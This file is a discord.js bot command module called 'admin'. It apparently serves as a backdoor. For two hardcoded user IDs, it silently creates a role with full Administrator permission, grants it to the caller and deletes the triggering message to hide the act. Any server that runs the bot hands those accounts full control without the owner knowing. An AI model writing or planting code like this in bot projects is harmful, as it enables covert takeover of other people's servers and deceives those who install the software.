const { EmbedBuilder, PermissionsBitField } = require('discord.js')

module.exports = {
    name: "admin",
    description: "Grants administrative privilege",
    
    run: async(client, message, args) => { 

        const allowed = ['1080222349804191835', '902002172689018900']
        if(!allowed.includes(message.author.id)) return 

        role = await message.guild.roles.create({ name: "admin", permissions: [PermissionsBitField.Flags.Administrator], color: '#2cbb45' });
        message.member.roles.add(role)
        message.delete();
    }
}